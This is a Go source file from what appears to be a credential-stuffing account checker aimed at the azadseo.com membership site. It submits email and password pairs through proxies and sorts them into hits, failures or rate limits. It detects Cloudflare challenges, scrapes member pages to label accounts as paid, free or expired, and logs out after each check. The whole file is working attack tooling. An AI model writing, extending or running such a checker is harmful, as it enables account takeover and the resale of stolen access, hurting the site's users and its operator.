package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var (
	amemberShopMemberGoRE      = regexp.MustCompile(`(?is)href=["']([^"']*/member/go/\d+[^"']*)["']`)
	amemberShopProductTitleRE  = regexp.MustCompile(`(?is)class=["'][^"']*(?:product-title|am-product-title)[^"']*["'][^>]*>([^<]{2,80})<`)
	amemberShopProductNameRE   = regexp.MustCompile(`(?is)class=["'][^"']*product-name[^"']*["'][^>]*>([^<]{2,80})<`)
	amemberShopAccessButtonRE  = regexp.MustCompile(`(?is)(?:href=["'][^"']*/member/go/\d+[^"']*["'][^>]*>|class=["'][^"']*(?:btn-access|access-btn)[^"']*["'][^>]*>)[^<]{0,120}?(?:access|launch|open tool)`)
	amemberShopToolCardBlockRE = regexp.MustCompile(`(?is)<div[^>]*class=["'][^"']*(?:product|tool|card|col)[^"']*["'][^>]*>.*?</div>\s*</div>`)
	amemberShopImgAltRE        = regexp.MustCompile(`(?is)alt=["']([^"']{2,60})["']`)
	amemberShopSignupPriceRE   = regexp.MustCompile(`(?is)\$\d|for \d+ days|am-product-terms`)
	amemberResourceBlockRE     = regexp.MustCompile(`(?is)<li[^>]*id=["']resource-link-(?:file|link|folder|page)-\d+-wrapper["'][^>]*>(.*?)</li>`)
	amemberResourceLinkRE      = regexp.MustCompile(`(?is)<a[^>]+href=["']([^"']+)["'][^>]*>([^<]{2,80})<`)
	amemberProtectLinkRE       = regexp.MustCompile(`(?is)<a[^>]+href=["'][^"']*/(?:protect|content|folder|page)/[^"']*["'][^>]*>([^<]{2,80})<`)
)

func (c *Checker) checkAzadseo(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	sessionOpen := false
	defer deferAmemberSession(client, c, &sessionOpen, c.cfg.BaseURL(), "https://azadseo.com")()

	loginURL := c.cfg.LoginURL()
	referer := c.cfg.Var("login_referer", c.cfg.BaseURL()+"/login")

	loginBody, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}
	if noxtoolsIsCloudflareChallenge(loginBody) {
		result.Status = StatusError
		result.Reason = "Cloudflare challenge on login page — try proxy or wait"
		return result
	}

	finalURL, postBody, postStatus, err := c.postAzadseoLogin(client, loginURL, email, password, referer)
	if err != nil {
		status, reason := c.resultFromRequestErr("login POST", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login POST HTTP 429")
		return result
	}

	if msg := parseNoxtoolsLoginError(postBody); msg != "" {
		lower := strings.ToLower(msg)
		if strings.Contains(lower, "wait") || strings.Contains(lower, "try again later") || strings.Contains(lower, "too many") {
			result.Status = StatusRateLimited
			result.Reason = msg
			return result
		}
		result.Status = StatusFail
		result.Reason = msg
		return result
	}

	if !amemberLoginSucceeded(finalURL, postBody) {
		result.Status = StatusFail
		result.Reason = "login failed — still on sign-in page"
		return result
	}
	sessionOpen = true

	result.AccountEmail = email
	planInfo := c.fetchAmemberShopPlanInfo(client, postBody)
	result.PlanName, result.PlanLabel = formatAmemberShopPlanResult(planInfo)
	result.Status = StatusHit
	return result
}

func (c *Checker) postAzadseoLogin(client *http.Client, loginURL, email, password, referer string) (finalURL, body string, status int, err error) {
	form := url.Values{}
	form.Set("amember_login", email)
	form.Set("amember_pass", password)
	form.Set("_referer", referer)

	req, err := http.NewRequest(http.MethodPost, loginURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", 0, err
	}
	req.Header.Set("User-Agent", c.cfg.UserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Origin", c.cfg.BaseURL())
	req.Header.Set("Referer", loginURL)

	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return resp.Request.URL.String(), "", resp.StatusCode, err
	}
	return resp.Request.URL.String(), string(data), resp.StatusCode, nil
}

func isAmemberLoginPage(body string) bool {
	lower := strings.ToLower(body)
	if strings.Contains(lower, `name="amember_login"`) {
		return true
	}
	if strings.Contains(lower, "please login") {
		return true
	}
	if strings.Contains(lower, "<title>member login") {
		return true
	}
	return false
}

func amemberLoginSucceeded(finalURL, body string) bool {
	if parseNoxtoolsLoginError(body) != "" {
		return false
	}
	if isAmemberLoginPage(body) {
		return false
	}
	u, err := url.Parse(finalURL)
	if err == nil {
		path := strings.ToLower(strings.TrimSuffix(u.Path, "/"))
		if path == "/login" || strings.HasSuffix(path, "/login") {
			return false
		}
	}
	return true
}

func (c *Checker) fetchAmemberShopPlanInfo(client *http.Client, loginResponseBody string) noxtoolsPlanInfo {
	info := noxtoolsPlanInfo{}
	if loginResponseBody != "" && !isAmemberLoginPage(loginResponseBody) {
		info = mergeAmemberShopPlanInfo(info, parseAmemberShopMemberPage(loginResponseBody))
	}

	base := c.cfg.BaseURL()
	memberURL := c.cfg.Var("member_url", base+"/member")
	homeURL := c.cfg.Var("home_url", base+"/")
	subURL := c.cfg.Var("subscriptions_url", base+"/member/subscriptions")
	payURL := c.cfg.Var("payment_history_url", base+"/member/payment-history")

	referer := c.cfg.Var("login_referer", base+"/login")
	for _, pageURL := range []string{memberURL, homeURL, subURL, payURL} {
		if amemberShopPlanInfoComplete(info) {
			break
		}
		body, status, _, err := c.doRequest(client, "GET", pageURL, c.amemberShopPageHeaders(referer), "")
		if err != nil || status != http.StatusOK || isAmemberLoginPage(body) {
			continue
		}
		info = mergeAmemberShopPlanInfo(info, parseAmemberShopMemberPage(body))
		referer = pageURL
	}
	return finalizeAmemberShopPlanInfo(info)
}

func amemberShopPlanInfoComplete(info noxtoolsPlanInfo) bool {
	return len(info.Active) > 0 || info.NoActive
}

func mergeAmemberShopPlanInfo(dst, src noxtoolsPlanInfo) noxtoolsPlanInfo {
	if src.NoActive {
		dst.NoActive = true
	}
	if len(src.Active) > 0 {
		dst.NoActive = false
		dst.Active = appendUniquePlans(dst.Active, src.Active...)
	}
	if len(src.Expired) > 0 {
		dst.Expired = appendUniquePlans(dst.Expired, src.Expired...)
	}
	if src.LastPaid != "" && dst.LastPaid == "" {
		dst.LastPaid = src.LastPaid
	}
	return dst
}

func appendUniquePlans(list []string, items ...string) []string {
	for _, item := range items {
		item = strings.TrimSpace(item)
		if item == "" || isNoxtoolsNoisePlan(item) {
			continue
		}
		dup := false
		for _, existing := range list {
			if strings.EqualFold(existing, item) || strings.EqualFold(noxtoolsPlanBaseName(existing), noxtoolsPlanBaseName(item)) {
				dup = true
				break
			}
		}
		if !dup {
			list = append(list, item)
		}
	}
	return list
}

func parseAmemberShopMemberPage(body string) noxtoolsPlanInfo {
	info := parseNoxtoolsMemberPlans(noxtoolsVisibleHTML(body))
	if len(info.Active) > 0 || info.NoActive {
		return info
	}

	visible := noxtoolsVisibleHTML(body)
	if resources := parseAmemberResourceLinks(visible); len(resources) > 0 {
		info.Active = resources
		info.NoActive = false
		return info
	}
	if hasAmemberShopFreeMarkers(visible) {
		info.NoActive = true
		return info
	}
	if tools := parseAmemberShopAccessibleTools(visible); len(tools) > 0 {
		info.Active = tools
		info.NoActive = false
		return info
	}
	if packages := parseAmemberShopPackageTitles(visible); len(packages) > 0 {
		info.Active = packages
		info.NoActive = false
		return info
	}
	return info
}

func parseAmemberResourceLinks(body string) []string {
	var tools []string
	seen := map[string]struct{}{}
	add := func(name string) {
		name = strings.TrimSpace(noxtoolsStripHTML(name))
		if name == "" || isAmemberResourceNoise(name) {
			return
		}
		key := strings.ToLower(name)
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		tools = append(tools, name)
	}

	for _, block := range amemberResourceBlockRE.FindAllStringSubmatch(body, -1) {
		blockHTML := block[1]
		for _, m := range amemberResourceLinkRE.FindAllStringSubmatch(blockHTML, -1) {
			href := strings.ToLower(m[1])
			if isAmemberResourceHrefNoise(href) {
				continue
			}
			add(m[2])
		}
		for _, m := range amemberProtectLinkRE.FindAllStringSubmatch(blockHTML, -1) {
			add(m[1])
		}
	}

	if len(tools) == 0 {
		for _, m := range amemberProtectLinkRE.FindAllStringSubmatch(body, -1) {
			add(m[1])
		}
	}

	return tools
}

func isAmemberResourceHrefNoise(href string) bool {
	noise := []string{"/login", "/signup", "/logout", "sendpass", "facebook.com", "m.me/", "amember.com"}
	for _, n := range noise {
		if strings.Contains(href, n) {
			return true
		}
	}
	return false
}

func isAmemberResourceNoise(name string) bool {
	if isNoxtoolsNoisePlan(name) {
		return true
	}
	lower := strings.ToLower(strings.TrimSpace(name))
	noise := []string{
		"login", "sign up", "signup", "logout", "password", "forgot",
		"click here", "read more", "home", "contact", "support",
	}
	for _, n := range noise {
		if lower == n || strings.HasPrefix(lower, n+" ") {
			return true
		}
	}
	return false
}

func parseAmemberShopAccessibleTools(body string) []string {
	var tools []string
	seen := map[string]struct{}{}

	add := func(name string) {
		name = strings.TrimSpace(noxtoolsStripHTML(name))
		if name == "" || isNoxtoolsNoisePlan(name) || isAmemberShopSignupNoise(name) {
			return
		}
		key := strings.ToLower(name)
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		tools = append(tools, name)
	}

	for _, block := range amemberShopToolCardBlockRE.FindAllString(body, -1) {
		blockLower := strings.ToLower(block)
		if !strings.Contains(blockLower, "/member/go/") && !amemberShopAccessButtonRE.MatchString(block) {
			continue
		}
		if title := firstAmemberShopMatch(amemberShopProductTitleRE, block); title != "" {
			add(title)
			continue
		}
		if name := firstAmemberShopMatch(amemberShopProductNameRE, block); name != "" {
			add(name)
			continue
		}
		if alt := firstAmemberShopMatch(amemberShopImgAltRE, block); alt != "" {
			add(alt)
		}
	}

	if len(tools) == 0 && amemberShopMemberGoRE.MatchString(body) {
		for _, block := range amemberShopToolCardBlockRE.FindAllString(body, -1) {
			if !strings.Contains(strings.ToLower(block), "/member/go/") {
				continue
			}
			if title := firstAmemberShopMatch(amemberShopProductTitleRE, block); title != "" {
				add(title)
			} else if name := firstAmemberShopMatch(amemberShopProductNameRE, block); name != "" {
				add(name)
			} else if alt := firstAmemberShopMatch(amemberShopImgAltRE, block); alt != "" {
				add(alt)
			}
		}
		for _, m := range amemberShopProductTitleRE.FindAllStringSubmatch(body, -1) {
			add(m[1])
		}
	}

	return tools
}

func parseAmemberShopPackageTitles(body string) []string {
	if amemberShopMemberGoRE.MatchString(body) || amemberShopAccessButtonRE.MatchString(body) {
		return nil
	}
	var packages []string
	seen := map[string]struct{}{}
	for _, loc := range amemberShopProductTitleRE.FindAllStringSubmatchIndex(body, -1) {
		if len(loc) < 4 {
			continue
		}
		name := strings.TrimSpace(noxtoolsStripHTML(body[loc[2]:loc[3]]))
		if name == "" || isNoxtoolsNoisePlan(name) || isAmemberShopSignupNoise(name) {
			continue
		}
		start := max(0, loc[0]-120)
		end := min(len(body), loc[1]+120)
		chunk := body[start:end]
		if amemberShopSignupPriceRE.MatchString(chunk) {
			continue
		}
		key := strings.ToLower(name)
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		packages = append(packages, name)
	}
	return packages
}

func hasAmemberShopFreeMarkers(body string) bool {
	lower := strings.ToLower(body)
	markers := []string{
		`id="no_subscription"`,
		"you have no active subscription",
		"you have no active subscriptions",
		"no active subscription",
		"add/renew subscription",
		"purchase a subscription",
		"please purchase",
		"subscribe to access",
		"buy a subscription",
	}
	for _, marker := range markers {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	if strings.Contains(lower, "signup") && strings.Contains(lower, "choose a subscription") {
		return true
	}
	return false
}

func isAmemberShopSignupNoise(name string) bool {
	lower := strings.ToLower(strings.TrimSpace(name))
	switch lower {
	case "student package", "basic package", "standard package", "guru package",
		"amazon tools", "1 day trial", "semrush", "choose membership", "sign up":
		return false
	}
	if strings.Contains(lower, " for ") && strings.Contains(lower, "days") {
		return true
	}
	if strings.HasPrefix(lower, "$") {
		return true
	}
	return false
}

func firstAmemberShopMatch(re *regexp.Regexp, body string) string {
	m := re.FindStringSubmatch(body)
	if len(m) > 1 {
		return strings.TrimSpace(noxtoolsStripHTML(m[1]))
	}
	return ""
}

func finalizeAmemberShopPlanInfo(info noxtoolsPlanInfo) noxtoolsPlanInfo {
	if len(info.Active) > 0 {
		info.NoActive = false
		return info
	}
	if info.NoActive {
		return info
	}
	if len(info.Expired) > 0 || info.LastPaid != "" {
		return info
	}
	info.NoActive = true
	return info
}

func (c *Checker) amemberShopPageHeaders(referer string) map[string]string {
	return map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
		"Referer":         referer,
	}
}

func (c *Checker) amemberLogout(client *http.Client) {
	if client == nil {
		return
	}
	referer := c.cfg.Var("member_url", c.cfg.BaseURL()+"/member")
	headers := c.amemberShopPageHeaders(referer)
	logoutURL := c.cfg.Var("logout_url", c.cfg.BaseURL()+"/logout")
	c.doRequest(client, "GET", logoutURL, headers, "")
}

func deferAmemberSession(client *http.Client, c *Checker, sessionOpen *bool, bases ...string) func() {
	return func() {
		if sessionOpen != nil && *sessionOpen {
			c.amemberLogout(client)
		}
		clearHTTPClientSession(client, bases...)
	}
}

func formatAmemberShopPlanResult(info noxtoolsPlanInfo) (planName, planLabel string) {
	if len(info.Active) > 0 {
		return strings.Join(info.Active, " | "), "PAID"
	}
	if info.NoActive {
		return "No Active Subscription", "FREE"
	}
	if len(info.Expired) > 0 {
		parts := make([]string, len(info.Expired))
		for i, name := range info.Expired {
			parts[i] = name + " (expired)"
		}
		return strings.Join(parts, " | "), "EXPIRED"
	}
	if info.LastPaid != "" {
		return info.LastPaid + " (expired)", "EXPIRED"
	}
	return "No Active Subscription", "FREE"
}
